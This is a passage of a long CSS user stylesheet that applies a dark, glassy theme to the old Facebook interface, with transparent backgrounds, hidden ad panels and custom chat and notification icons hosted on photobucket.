li,.photos_tab,.recent_notes,.side_note,.album_information,.results,.logged_out_register_vertical,.logged_out_register_wrapper,.deleted,.home_prefs_saved,.share_send,.header_divide,.thread_header,.message,.status_composer_inner,.fbpage_edit_header,.app_switcher_unselected,.status_placeholder,.UIComposer_TDTextArea, .UIHomeBox_Content,.UIHotStory,.home_welcome,.summary_custom,.source_list,.minor_section,.UIComposer_Attachment_TDTextArea,.info_diff span,.matches span,.menu_content,.UIcomposer_Dropdown_List,.UIComposer_Dropdown_Item,.feed_auto_update_settings,.container,.silver_footer,.friend_grid_col,.token > span,.tokenizer_input,.tokenizer_input *,#friends_multiselect,.flink_inner a:hover,#grouptypes,#startagroup p,.UICheckList,.FriendAddingTool_InnerMenu,.pagerpro li a:hover,#friend_filters,.fb_menu_count_holder,.hp_box,.view_all_link,.app_settings_tab,.tab_link,#flm_add_title,#flm_current_title,#flm_list_selector .selector,#friends_header,#friends_wrapper,.contacts_header,.contacts_wrapper,.row1,.show_advanced_controls,.FriendAddingTool_InnerMenu,.UISelectList,.UISelectList_Item,.UIIntentionalStory_CollapsedStories,.email_section,.section_header_bg,.rqbox,.ar_highlight,#buddy_list_panel,.panel_item,.friendlist_status,.options_actions a span,.chat_setting label,.toolbox,.chat_actions,.UIWell,.UIComposer_InputArea,.invite_panel,.apinote,.UIInterstitialBox_Container,.ical_section,.maps_brand,.divbox4,.lighteryellow,.fan_status_inactive,.UIBeeperCap,.footer_fallback_box,.footer_refine_search_company_school_box,.footer_refine_search_email_box,.UINestedFilterList_List,.UINestedFilterList_SubItem,.UINestedFilterList_Item_Link,.UINestedFilterList_Item_Link,.UINestedFilterList_SubItem_Link,.app_dir_app_summary,.app_dir_featured_app_summary,.app_dir_app_wide_summary,.profile_top_bar_container,.UIStream_Border,.question_container,.unselected_list label:nth-child(odd),.request_box,.showcase,.steps li,#fb_sell_profile div,.promotion,.UIOneOff_Container tabs,.whocan,.lock_r,.privacy_edit_link,.friend_list_container li:hover a,.email_field,.app_custom_content,#page,.thumb,.step_frame,.radioset,.radio_option,.page_option,.explanation_note,.card,.empty_albums,.right_column,.full_widget,.connect_top,.creative_preview,.creative_column,.UIAdmgrCreativePreview,.UIEMUASFrame,.banner_wrapper,.dashboard,.pages,#photocrop_instructions,.UIContentBox_GrayDarkTop,.UIContentBox_Gray,.UIContentBox,#FriendsPage_ListingViewContainer,.post_editor,.entry,.fb_dashboard,.spacey_footer,.thread,.post,.UIWashFrame_Content,table[bindpoint=\"thread_row\"],table[bindpoint=\"thread_row\"] tbody,.GBThreadMessageRow,.message_pane,.UIComposer_ButtonArea, .UIRoundedTransparentBox_Border,.feedbackView,.group,.streamPaginator,.nullStatePane,.inboxControls,.filterControls,.inboxView tr,.tabView,.tabView li a,.splitViewContent,.photoGrid,.albumGrid,.frame .img,.gridViewCrop,.gridView,.profileWall form,.story form,.formView,.inboxCompose,.LTokenizerToken,#icon_garden,#buddy_list_tab,#presence_notifications_tab,#editphotoalbum .photo,.UISuggestionList_SubContainer,.fan_action,.video_pane,.notify_option, .video_gallery,.video,.uiTooltip:not(.close):hover,.people_table,.people_table table,#main,#navlist li a.inactive,#rbar,.plays_bar,#fans,.updates_messages,.sent_updates_container,.subitem,#pagelet_navigation,.fbxWelcomeBox,.friends_online_sidebar,.uiTextHighlight,.tab_box,.bordered_list_item,.SettingsPage_PrivacySections,.profile-pagelet-section,.profileInfoSection,#pts_invite_section,.main_body,.masterControl,.masterControl .main,.linkbox,.uiTypeaheadView .search li,.language_form,#ads_privacy_examples,.fbPrivacyPage,.UIStandardFrame_SidebarAds,#sidebar_ads,#globalWrapper #content,.portlet,.pBody,.noarticletext,#catlinksm,.devsiteHeader,.devsiteFooter,.devsiteContent,.blockpost,.blockpost #topic,.blockpost .postleft,.blockpost .postfootleft,.fbRecommendation,.fbRecommendationWidgetContent,.add_comment,.connect_comment_widget .comment_content,.error,.even,.fbFeedbackPager,.uiComposerMessageBox,.facepileHolder,.notePermalinkMaincol,.profilePreviewHeader,.pageAttachment,.editExperienceForm,.tourSteplist,.tourSteplist ol,.uiStep,.uiStep:not(.uiStepSelected) .part, .uiStepSelected .part:not(.middle),.better_fb_cp,legend,.bfb_option_body div,.messaging_nux_header,.fbInsightsTable .odd td,.user.selected,.highlighter div b,.fbQuestionsBlingBox:hover,.friend_list_container,.jewelItemList li a:active,#bfb_tip_pagelet > div,.UIUpcoming_Item,.video_with_comments,.video_info,.fbFeedTickerStory,.fbFeedTicker.fixed_elem,.fbxPhoto .fbPhotoImageStage .stageContainer,#DeveloperAppBody > .content,.opengraph .preview,.coverNoImage,.fbTimelineScrubber,.fbTimelineAds,.fbProfilePlacesFilter,.fbFeedbackPost .UIImageBlock_Content,.permissionsViewEducation,.UIFaq_Container,#wizard,.captionArea,#bfb_options_content .option,.bfb_tab_selector,.UIMessageBoxExplanation,.uiStreamSubstories {background: rgba(20,20,20,.2) !important;}\n\n.uiSelector .uiSelectorButton,.UIRoundedBox_Corner,.quote,.em,.UIRoundedBox_TL,.UIRoundedBox_TR,.UIRoundedBox_BR,.UIRoundedBox_LS,.UIRoundedBox_BL,.profile_color_bar,.pagefooter_topborder,.menu_content,h3,#feed_content_section_friend_lists,ul,li[class=\"\"],.comment_box,.comment,#homepage_bookmarks_show_more,.profile_top_wash,.canvas_container,.composer_rounded,.composer_well,.composer_tab_arrow,.composer_tab_rounded,.tl,.tr,.module_right_line_block,.body,.module_bottom_line,.lock_b_bottom_line,#info_section_info_2530096808 .info dt,.pipe,.dh_new_media,.dh_new_media .br,.frn_inpad,#frn_lists,#frni_0,.frecent span,h3 span,.UIMediaHeader_TitleWash,.editor_panel .right,.UIMediaButton_Container tbody *,#userprofile,.profile_box,.date_divider span,.corner,.profile #content .UIOneOff_Container,.ff3,.photo #nonfooter #page_height,.home #nonfooter #page_height,.home .UIFullPage_Container,.main-nav,.generic_dialog,#fb_multi_friend_selector_wrapper,#fb_multi_friend_selector,.tab span,.tabs,.pixelated,.disabled,.title_header .basic_header,#profile_tabs li,#tab_content,.inside td,.match_link span,tr[fbcontext=\"41097bfeb58d\"] table,.accent,#tags h2,.read_updates,.user_input,.home_corner,.home_side,.br,.share_and_hide,.recruit_action,.share_buttons,.input_wrapper,.status_field,.UIFilterList_ItemRight,.link_btn_style span,.UICheckList_Label,#flm_list_selector .Tabset_selected .arrow,#flm_list_selector .selector .arrow .sel_link,.friendlist_status .title a,.online_status_container,.list_drop_zone_inner,.good_username,.WelcomePage_Container,.UIComposer_ShareButton *,.UISelectList_Label,.UIComposer_InputShadow .UIComposer_TextArea,.UIMediaHeader_TitleWrapper,.boxtopcool_hg,.boxtopcool_trg,.boxtopcool_hd,.boxtopcool_trd,.boxtopcool_bd,.boxtopcool_bg,.boxtopcool_b,#confirm_button,.title_text,#advanced_friends_1,.fb_menu_item_link,.fb_menu_item_link small,.white_hover,.GBTabset_Pill span,.UINestedFilterList_ItemRight,.GBSearchBox_Input input,.inline_edit,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.LTokenizer,.Mentions_Input,form.comment div,.ufi_section,.BubbleCount,.BubbleCount_Right,.UIStory,.object_browser_pager_more,.friendlist_name,.friendlist_name a,.switch,#tagger,.tagger_border,.uiTooltip,#reorder_fl_alert,.UIBeeper_Full,#navSearch,#navAccount,#navAccountPic,#navAccountName,#navAccountInfo,#navAccountLink,#mailBoxItems,#pagelet_chat_home h4,.buddy_row,.home_no_stories,#xpageNav li .navSubmenu,.uiListItem:not(.ufiItem),.uiBubbleCount,.number,.fbChatBuddylistPanel,.wash,.settings_screenshot,.privacyPlan .uiListItem:hover,.no_border,.auxiliary .highlight,.emu_comments_box_nub,.numberContainer,.uiBlingBox,.uiBlingBox:hover span,.callout_buttons,.uiWashLayoutEmptyGradientWash,.inputContainer,.editNoteWrapperInput,.fbTextEditorToolbar,.logoutButton input,#contentArea .uiHeader + .uiBoxGray,.uiTokenizer,#bfb_tabs,.profilePictureNuxHighlight,.profile-picture,#ci_module_list,.textBoxContainer,#date_form .uiButton,.insightsDateRange,.MessagingReadHeader,.groupProfileHeaderWash,.questionSectionLabel,.metaInfoContainer,.uiStepList ol,.friend_list,.fbFeedbackMentions,.bb .fbNubFlyoutHeader,.bb .fbNubFlyoutFooter,.fbNubFlyoutInner .fbNubFlyoutFooter,.gradientTop,.gradientBottom,.helpPage,.fbEigenpollTypeahead .plus,.uiSearchInput,.opengraph,#developerAppDetailsContent,.timelineLayout #contentCol,.attachmentLifeEvents,.fbProfilePlacesFilterBar,.uiStreamHeader,.uiStreamHeaderChronologicalForm,.inner .text,.pageNotifPopup,.uiButtonGroup,.navSubmenuPageLink,.fbTimelineTimePeriod,.bornUnit,.mleFooter,#bfb_filter_add_row,#bfb_options .option .no_hover,.fbTimelinePhotosSeparator h4 span,.withsubsections,.showMore,.event_profile_information tr:hover,.nux_highlight_nub,.uiSideNav .uiCloseButton,.uiSideNav .uiCloseButton input,.fb_content,.uiComposerAttachment .selected .attachmentName,.fbHubsTokenizer,.coverEmptyWrap,.uiStreamHeaderText,.pagesTimelineButtonPagelet,.fbNubFlyoutBody,#pageNav .tinyman:hover,#navHome:hover,.fbRemindersThickline,.uiStreamEdgeStoryLine hr,.uiInfoTable tbody tr:hover,.fbTimelineUFI,#contentArea,.leftPageHead,.rightPageHead,.anchorUnit,#pageNav .topNavLink a:focus,.timeline_page_inbox_bar,.uiStreamEdgeStoryLineTx,.pluginRecommendationsBarButton,.pluginRecommendationsBarTop table, .uiToken, .ogAggregationPanelText, .UFIRow {background: transparent !important;}\n\n.UIObject_SelectedItem,.sidebar_item_header,.announcement_title,#pagefooter,.selected:not(.key-messages):not(.key-events):not(.key-media):not(.key-ff):not(.page):not(.group):not(.user):not(.app),.date_divider_label,.profile_action,.blurb ,.tabs_more_menu,.more a span,.selected h2,.column h2,.ffriends,.make_new_list_button_table tr,.title_header,.inbox_menu,.side_column,.section_header h3 span,.media_header,#album_container,.note_dialog,.dialog,.has_app,.UIMediaButton_Container,.dialog_title,.dialog_content,#mobile_notes_announcement,.see_all,#profileActions,.fbpage_group_title,.UIProfileBox_SubHeader,#profileFooter,.share_header,#share_button_dialog,.flag_nav_item_selected,.new_user_guide_content h2,#safety_page h4,.section_banner,.box_head,#header_bar,.content_sidebar h3,.content_header,#events h3,#blog h3,.footer_border_bottom,.firstHeading,#footer,.recent_news h3,.wrapper div h2,.UIProfileBox_Header,.box_header,.bdaycal_month_section,#feedTitle,.pop_content,#linkeditor,.UIMarketingBox_Box,.utility_menu a,.typeahead_list,.typeahead_suggestions,.typeahead_suggestion,.fb_dashboard_menu,.green_promotion,.module h2,.current_path,.boardkit_title,.current,.see_all2,.plain,.share_post,.add-link,li.selected,.active_list a,#photoactions a:not(#rotaterightlink):not(#rotateleftlink),.UIPhotoTagList_Header,.dropdown_menu,.menu_content,.menu_content li a:hover,.menu_content li:hover,#edit_profilepicture,.menu_content div a:hover,.contact_email_pending,.req_preview_guts,.inputbutton,.inputsubmit,.activation_actions_box,.wall_content,.matches_content_box_title,.new_menu_selected,#editnotes_content,#file_browser,.chat_window_wrapper,.chat_window,.chat_header,.hover,.dc_tabs a,.post_header,.header_cell,#error,.filters,.pages_dashboard_panel h2,.srch_landing h2,.bottom_tray,.next_action,.pl-divider-container,.sponsored_story,.header_current,.discover_concerts_box,.header,.sidebar_upsell_header,.activity_title h2,.wall_post_title,#maps_options_menu,.menu_link,.gamerProfileTitleBar,.feed_rooster ,.emails_success,.friendTable table:hover,.board_topic:hover,.fan_table table:hover,#partylist .partyrow:hover,.latest_video:hover,.wallpost:hover,.profileTable tr:hover,.friend_grid_col:hover,.bookmarks_list li:hover,.requests_list li:hover,.birthday_list li:hover,.tabs li,.fb_song:hover,.share_list .item_container:hover,.written a:hover,#photos_box .album:hover,.people .row .person:hover,.group_list .group:hover,.confirm_boxes .confirm:hover,.posted .share_item_wide .share_media:hover,.note:hover,.editapps_list .app_row:hover,.my_networks .blocks .block:hover,.mock_h4,#notification_options tr:hover,.notifications_settings li:hover,.mobile_account_main h2,.language h4,.products_listing .product:hover,.info .item .item_content:hover,.info_section:hover,.recent_notes p:hover,.side_note:hover,.suggestion,.story:hover,.post_data:hover,.album_row:hover,.track:hover,#pageheader,.message:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIActionButton,.UIActionButton_Link,.confirm_button,.silver_dashboard,span.button,.col:hover,#photo_tag_selector,#pts_userlist,.flink_dropdown,.flink_inner,.grouprow:hover,#findagroup h4,#startagroup h4,.actionspro a:hover,.UIActionMenu_Menu,.UICheckList_Label:hover,.make_new_list_button_table,.contextual_dialog_content,#flm_list_selector .selector:hover,.show_advanced_controls:hover,.UISelectList_check_Checked,.section_header,.section_header_bg,#buddy_list_panel_settings_flyout,.options_actions,.chat_setting,.flyout,.flyout .UISelectList,.flyout .new_list,#tagging_instructions,.FriendsPage_MenuContainer,.UIActionMenu,.UIObjectListing:hover,.UIStory_Hide .UIActionMenu_Wrap,.UIBeeper,.branch_notice,.async_saving,.UIActionMenu .UIActionMenu_Wrap:hover,.attachment_link a:hover,.UITitledBox_Top,.UIBeep,.Beeps,#friends li a:hover,.apinote h2,.UIActionButton_Text,.rsvp_option:hover,.onglettrhi,.ongletghi,.ongletdhi,.ongletg,.onglettr,.ongletd,.confirm_block, .unfollow_message,.UINestedFilterList_SubItem_Selected .UINestedFilterList_SubItem_Link,.UINestedFilterList_SubItem_Link:hover,.UINestedFilterList_Item_Link:hover,.UINestedFilterList_Selected .UINestedFilterList_Item_Link,.app_dir_app_summary:hover,.app_dir_featured_app_summary:hover,.app_dir_app_wide_summary:hover,.UIStory:hover,.UIPortrait_TALL:hover,.UIActionMenu_Menu div,.UIButton_Blue,.UIButton_Gray,.quiz_cell:hover,.UIFilterList > .UIFilterList_Title,.message_rows tr:hover,.ntab:hover,.thumb_selected,.thumb:hover,.hovered a,.pandemic_bar,.promote_page,.promote_page a,.create_button a,.nux_highlight,.UIActionMenu_Wrap,.share_button_browser div,.silver_create_button,.painted_button,.flyer_button,table[bindpoint=\"thread_row\"] tbody tr:hover,.GBThreadMessageRow:hover,#header,.button:not(.close):not(.uiSelectorButton):not(.videoicon):not(.toggle),h4,button:not(.as_link),#navigation a:hover,.settingsPaneIcon:hover,a.current,.inboxView tr:hover,.tabView li a:hover,.friendListView li:hover,.LTypeaheadResults,.LTypeaheadResults a:hover,.dialog-title, .UISuggestionList_SubContainer:hover,.typeahead_message,.progress_bar_inner,.video:hover,.advanced_controls_link,.plays_val,.lightblue_box,.FriendAddingTool_InnerMenu .UISelectList,.gray_box,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,#navAccount li:not(#navAccountInfo),.jewelHeader,.seeMore,#mailBoxItems li,#pageFooter,.uiSideNav .key-nf:hover,.key-messages .item:hover,.key-messages ul li:hover,.key-events ul li:hover,.key-media ul li:hover,.key-ff ul li:hover,.key-apps:hover,.key-games:hover,.uiSideNav .sideNavItem:not(.open) .item:hover,.fbChatOrderedList .item:hover a,.uiHeader,.uiListItem:not(.mall_divider):hover,.uiSideNav li.selected > a,.ego_unit:hover,.results,.bordered_list_item:hover,.fbConnectWidgetFooter,#viewas_header,.fbNubFlyoutTitlebar,.info_text,.stage,.masterControl .selected a,.masterControl .controls .item a:hover,.uiTypeaheadView .search,.gigaboxx_thread_hidden_messages,.uiMenu,.uiMenuInner,.itemAnchor,.gigaboxx_thread_branch_message,.uiSideNavCount,.uiBoxYellow,.loggedout_menubar_container,.pbm .uiComposer,.megaphone_box,.uiCenteredMorePager,.fbEditProfileViewExperience:hover,.uiStepSelected .middle,.GM_options_header,.bfb_tab_selected, #MessagingShelfContent,.connect_widget_like_button,.uiSideNav .open,.fbActivity:hover,.fbQuestionsPollResultsBar,.insightsDateRangeCustom,.fbInsightsTable thead th,.mall_divider,.attachmentContent .fbTabGridItem:hover,.jewelItemNew,#MessagingThreadlist .unread,.type_selected,.bfb_sticky_note,.UIUpcoming_Item:hover,.progress_bar_outer,.fbChatBuddyListDropdown .uiButton,.UIConnectControlsListSelector .uiButton,.instructions,.uiComposerMetaContainer,.uiMetaComposerMessageBoxShelf,#feed_nux,#tickerNuxStoryDiv,.fbFeedTickerStory:hover,.fbCurrentStory:hover,.uiStream .uiStreamHeaderTall,.fbChatSidebarMessage,.fbPhotoSnowboxInfo,.devsitePage .menu,.devsitePage .menu .content,#devsiteHomeBody .wikiPanel > div,.toolbarContentContainer,.fbTimelineUnitActor,#fbTimelineHeadline,.fbTimelineNavigation,.fbTimelineFeedbackActions,.timelineReportHeader,.fbTimelineCapsule .timelineUnitContainer:hover,.timelineReportContainer:hover,.fbTimelineComposerAttachments .uiListItem:hover span a,.timelinePublishedToolbar,.timelineRecentActivityLabel,.fbTimelineMoreButton,.overlayTitle,.friendsBoxHeader,.escapeHatchHeader,.tickerStoryAllowClick,.appInvite:hover,.fbRemindersStory:hover,.lifeEventAddPhoto a:hover,.insights-header,.ufb-dataTable-header-container,.ufb-button,.older-posts-content,.mleButton:hover,.btnLink,.fill,.cropMessage,.adminPanelList li:hover a,.tlPageRecentOverlayStream,.addListPageMegaphone,.searchListsBox,.ogStaticPagerHeader,.dialogTitle,#rogerSidenavCallout,.fbTimelineAggregatedMapUnitSeeAll,.shareRedesignContainer,.ogSingleStoryText,.ogSliderAnimPagerPrevWrapper,.ogSliderAnimPagerNextWrapper,.shareRedesignText,.pluginRecommendationsBarTop,.timelineRecentActivityStory:hover, .ogAggregationPanelUFI\n{ background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny.png\") fixed repeat !important;}\n\n.hovercard .stage,.profileChip,.GM_options_wrapper_inner,.MessagingReadHeader .uiHeader,#MessagingShelf,#navAccount ul,.uiTypeaheadView,#blueBar,.uiFacepileItem .uiTooltipWrap,.fbJewelFlyout,.jewelItemList li,.notification:not(.jewelItemNew),.fbNubButton,.fbChatTourCallout .body,.uiContextualDialogContent,.fbTimelineStickyHeader .back,.timelineExpandLabel:hover,.pageNotifFooter a,.fbSettingsListLink:hover,.uiOverlayPageContent,#bfb_option_list,.fbPhotoSnowlift .rhc,.ufb-tip-title,.balloon-content,.tlPageRecentOverlayTitle,.uiDialog,.uiDialogForm,.permissionsLockText, .uiMenuXBorder,.-cx-PRIVATE-uiDialog__content,.-cx-PRIVATE-uiDialog__title, ._k5\n{ background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny.png\") fixed repeat, rgba(10,10,10,.6) !important; }\n\n.unread .badge,.fbDockChatBuddyListNub .icon,.sx_7173a9,.selectedCheckable .checkmark {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball15.png\") no-repeat right center!important;}\n\ntable[class=\" \"] .badge:hover,table[class=\"\"] .badge:hover,.offline .fbDockChatBuddyListNub .icon,.fbChatSidebar.offline .fbChatSidebarMessage .img  {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball15.png\") no-repeat right center!important;}\n\n.fbChatSidebar.offline .fbChatSidebarMessage .img {height: 16px !important;}\n\n.offline .fbDockChatBuddyListNub .icon,.fbDockChatBuddyListNub .icon,.sx_7173a9 {margin-top: 0 !important;height: 15px !important;}\n\na.idle,.buddyRow.idle .buddyBlock,.fbChatTab.idle .tab_availability,.fbChatTab.disabled .tab_availability,.chatIdle .chatStatus,.idle .fbChatUserTab .wrap,.chatIdle .uiTooltipText,.markunread,.bb .fbDockChatTab.user.idle .titlebarTextWrapper,.fbChatOrderedList .item:not(.active) .status {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball10paddedright.png\") no-repeat left center !important;}\n\n.fbChatOrderedList .item .status {width: 10px !important;}\n\n.headerTinymanName {max-width: 320px !important; white-space: nowrap !important; overflow: hidden !important;}\n\n.uiTooltipText {padding-left: 14px !important;border: none !important;}\n \n.fbNubButton,.bb .fbNubFlyoutTitlebar,.bb .fbNub .noTitlebar,.fbDockChatTab,#fbDockChatBuddylistNub .fbNubFlyout,.fbDockChatTabFlyout,.titlebar {border-radius: 8px 8px 0 0!important;}\n\n.uiSideNav .open {padding-right: 0 !important;}\n.uiSideNav .open,.uiSideNav .open > *,#home_stream > *,.bb .rNubContainer .fbNub,.fbChatTab {margin-left: 0 !important;}\n.uiSideNav .open ul > * {margin-left: -20px !important;}\n.uiSideNav .open .subitem > .rfloat {margin-right: 20px !important;}\n\n.timelineUnitContainer .timelineAudienceSelector .uiSelectorButton {padding: 1px !important; margin: 4px 0 0 4px !important;}\n.timelineUnitContainer .audienceSelector .uiButtonNoText .customimg {margin: 2px !important;}\n.timelineUnitContainer .composerAudienceSelector .customimg {opacity: 1 !important; background-position: 0 1px !important; padding: 0 !important;}\n\n.fbNub.user:not(.disabled) .wrap {padding-left: 15px !important;}\n.fbNubFlyoutTitlebar .titlebarText {padding-left: 12px !important;}\n\na.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.uiMenu .checked .itemAnchor {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball10paddedright.png\") no-repeat !important;}\n\na.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,a.idle,.buddyRow.idle .buddyBlock {background-position: right center !important;}\n\n.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.user .fbChatUserTab .wrap {background-position: left center !important;}\n\n.uiMenu .checked .itemAnchor {background-position: 5px center !important;}\n\n.markunread,.markread {background-position: 0 center !important;}\n\n.chatIdle .chatStatus,.chatOnline .chatStatus {width: 10px !important;height: 10px !important;background-position: 0 0 !important;}\n\n#fbRequestsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends-Gray.png\") no-repeat center center !important;}\n\n#fbRequestsJewel:hover .jewelButton,#fbRequestsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends.png\") no-repeat center center !important;}\n\n#fbMessagesJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon-gray.png\") no-repeat center center !important;}\n\n#fbMessagesJewel:hover .jewelButton,#fbMessagesJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon.png\") no-repeat center center !important;}\n\n#fbNotificationsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth-gray.png\") no-repeat center center !important;}\n\n#fbNotificationsJewel:hover .jewelButton,#fbNotificationsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth.png\") no-repeat center center !important;}\n\n.topBorder,.bottomBorder {background: #000 !important;}\n\n.pl-item,.ical,.pop_content  {background-color: #333 !important;}\n.pl-alt {background-color: #222 !important;}\n\n.friend:hover,.friend:not(.idle):hover,.fbTimelineRibbon {background-color: rgba(10,10,10,.6) !important;}\n\n.maps_arrow,#sidebar_ads,.available .x_to_hide,.left_line,.line_mask,.chat_input_border,.connect_widget_button_count_nub,\n.uiStreamPrivacyContainer .uiTooltip .img,.UIObjectListing_PicRounded,.UIRoundedImage_CornersSprite,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TR,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BR,.UILinkButton_R,.pagesAboutDivider  {visibility:hidden !important;}\n\n.nub,#contentCurve,#pagelet_netego_ads,img.plus,.highlighter,.uiToolbarDivider,.bfb_sticky_note_arrow_border,.bfb_sticky_note_arrow,#ConfirmBannerOuterContainer,.uiStreamHeaderBorder,.topBorder,.bottomBorder,.middleLink:after,.sideNavItem .uiCloseButton,.mask,.topSectionBottomBorder {display: none !important;}\n\n.fbChatBuddyListTypeahead {display: block !important;}\n\n.chat_input {width: 195px !important;}\n\n.fb_song_play_btn,.friend,.wrap,.uiTypeahead,.share,.raised,.donated,.recruited,.srch_landing,.story_editor,.jewelCount span, .menuPulldown {background-color: transparent !important;}\n\n.extended_link div {background-color: #fff !important}\n\n#fbTimelineHeadline,.coverImage {width: 851px !important; margin-left: 1px !important;}\n\n*:not([style*=border]) {border-color: #000 !important;}\n\n#feed_content_section_applications *,#feed_header_section_friend_lists *,.summary,.summary *,.UIMediaHeader_TitleWash,.UIMediaHeader_TitleWrapper,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.borderTagBox,.innerTagBox,.friend,.fbNubFlyoutTitlebar,.fbNubButton {border-color: transparent !important;}\n\n.innerTagBox:hover {border-color: rgba(10,10,10,.45) !important;box-shadow: 0 0 5px 4px #9cf !important;}\n\n.status_placeholder,.UIComposer_TDTextArea,.UIComposer_TextAreaShadow,.UIContentBox ,.box_column,form.comment div,.comment_box div,#tagger,.UIMediaItem_Wrapper,#chat_tab_bar *,.UIActionMenu_ButtonOuter input[type=\"button\"],.inner_button,.UIActionButton_Link,.divider,.UIComposer_Attachment_TDTextArea,#confirm_button,#global_maps_link,.advanced_selector,#presence_ui *,.fbFooterBorder,.wash,.main_body,.settings_screenshot,.uiBlingBox,.inputContainer *,.uiMentionsInput,.uiTypeahead,.editNoteWrapperInput,.date_divider,.chatStatus,#headNav,.jewelCount span,.fbFeedbackMentions .wrap,.uiSearchInput span,.uiSearchInput,.fbChatSidebarMessage,.devsitePage .body > .content,.timelineUnitContainer,.fbTimelineTopSection,.coverBorder,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,#navAccount.openToggler,#contentArea,.uiStreamStoryAttachmentOnly,.ogSliderAnimPagerPrev .content,.ogSliderAnimPagerNext .content,.ogSliderAnimPagerPrev .wrapper,.ogSliderAnimPagerNext .wrapper,.ogSingleStoryContent,.ogAggregationAnimSubstorySlideSingle,.uiCloseButton, .ogAggregationPanelUFI, .ogAggregationPanelText {border: none !important;}\n\n.uiStream .uiStreamHeaderTall {border-top: none !important; border-bottom: none !important;}\n\n.attachment_link a:hover,input[type=\"input\"],input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIFilterList_Selected,.make_new_list_button_table,.confirm_button,.fb_menu_title a:hover,.Tabset_selected {border-bottom-color: #000 !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: #000 !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: #000 !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: #000 !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}\n\n.UITabGrid_Link,.fb_menu_title a,.button_main,.button_text,.button_left {border-bottom-color: transparent !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: transparent !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: transparent !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: transparent !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}\n\n.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide, .fbSettingsListItemDelete,.fg_action_hide,img[src=\"http://static.ak.fbcdn.net/images/streams/x_hide_story.gif?8:142665\"],.close,.uiSelector .uiCloseButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/closeX.png\") no-repeat !important;text-decoration: none !important;height: 18px !important;}\n\ndiv.fbChatSidebarDropdown .uiCloseButton,.fbDockChatDropdown .uiSelectorButton,.storyInnerContent .uiSelectorButton,.fbTimelineAllActivityStorySelector .uiButton .img {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/GrayGear_15.png\") center center no-repeat !important; width: 26px !important;}\n\ndiv.fbChatSidebarDropdown .uiCloseButton {height: 23px !important;}\n\n.videoicon {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/video_chat_small.png\") center center no-repeat !important; }\n\n.uiStream .uiStreamFirstStory .highlightSelector .uiSelectorButton {margin-top: -5px !important;}\n\n.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide,.uiCloseButton,.fbSettingsListItemDelete {width: 